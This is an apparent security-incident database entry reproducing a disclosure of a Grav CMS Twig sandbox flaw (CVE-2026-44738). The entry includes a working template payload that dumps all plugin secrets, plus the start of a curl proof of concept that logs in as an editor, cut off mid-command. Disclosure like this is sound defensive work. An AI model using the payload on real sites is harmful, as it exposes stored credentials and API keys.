---
title: "INC-08548 — Grav: Twig sandbox allows editor-role users to exfiltrate all plugin secrets via Config::toArray()"
layout: incident
permalink: /incident/INC-08548.html
incident_id: INC-08548
year: 2026
severity: High
description_preview: "## Summary The Twig sandbox allow-list permits any user with the `admin.pages` role to call `config.toArray()` from within a page body, dumping the entire merged site configuration — including all plu"
tags_str: "cve, getgrav-grav, ghsa"
---

{% raw %}
<div class="incident-anchor" id="inc-08548" markdown="1">

### INC-08548  [↗](/incident/INC-08548.html)

**Grav: Twig sandbox allows editor-role users to exfiltrate all plugin secrets via Config::toArray()**  
_2026-05 · vulnerability-disclosure · Severity: High_

CVEs: `CVE-2026-44738`
CWEs: `CWE-200`
CVSS: **7.7** — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`

## Summary The Twig sandbox allow-list permits any user with the `admin.pages` role to call `config.toArray()` from within a page body, dumping the entire merged site configuration — including all plugin secrets (SMTP passwords, AWS keys, OAuth client secrets, API tokens) — into the rendered HTML. No administrator privileges are required. ## Details The Twig sandbox allow-list in `system/config/security.yaml` explicitly permits `Config::toArray()` for the `Grav\Common\Config\Config` class: ```yaml - class: 'Grav\Common\Config\Config' methods: 'get, toarray, value, default, offsetget, offsetexists' ``` The `config` object — which holds the full merged configuration tree including every key under `plugins.*` — is injected into every sandboxed render in `system/src/Grav/Common/Twig/Twig.php` (line 292): ```php $twig_vars = [..., 'config' => $config, ...] ``` Any editor with `admin.pages` can save a page with `process.twig: true` in the frontmatter and the following payload in the body: ``` {{ config.toArray()|json_encode|raw }} ``` When the page is rendered, the full config tree is dumped as JSON in the HTML, including all plugin secrets stored under `user/config/plugins/*.yaml`. ## PoC ```bash # Step 1 — Get login nonce NONCE=$(curl -sc /tmp/cookies.txt http://TARGET/admin \ | grep -oP '(?<=name="login-nonce" value=")[^"]+') # Step 2 — Login as editor (no admin.super) curl -sc /tmp/cookies.txt -b /tmp/cookies.txt \ -X POST http://TARGET/admin \ --data-urlenc

**Affected:** composer/getgrav/grav  
**Attack vector:** `data-exfiltration`  

**OWASP LLM Top 10:** `LLM03`  
**OWASP Agentic (ASI):** `ASI03`, `ASI04`  
**NIST AI RMF:** `GOVERN-1.4`, `GOVERN-6.1`  
**MITRE ATLAS:** `AML.T0010`, `AML.T0012`  

**References:**
- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-44738) _(advisory)_
- [GHSA-j274-39qw-32c9](https://github.com/advisories/GHSA-j274-39qw-32c9) _(advisory)_
- [https://github.com/getgrav/grav/security/advisories/GHSA-j274-39qw-32c9](https://github.com/getgrav/grav/security/advisories/GHSA-j274-39qw-32c9) _(reference)_
- [https://github.com/getgrav/grav/releases/tag/2.0.0-rc.2](https://github.com/getgrav/grav/releases/tag/2.0.0-rc.2) _(reference)_

**Tags:** `cve`, `getgrav-grav`, `ghsa`

</div>

{% endraw %}
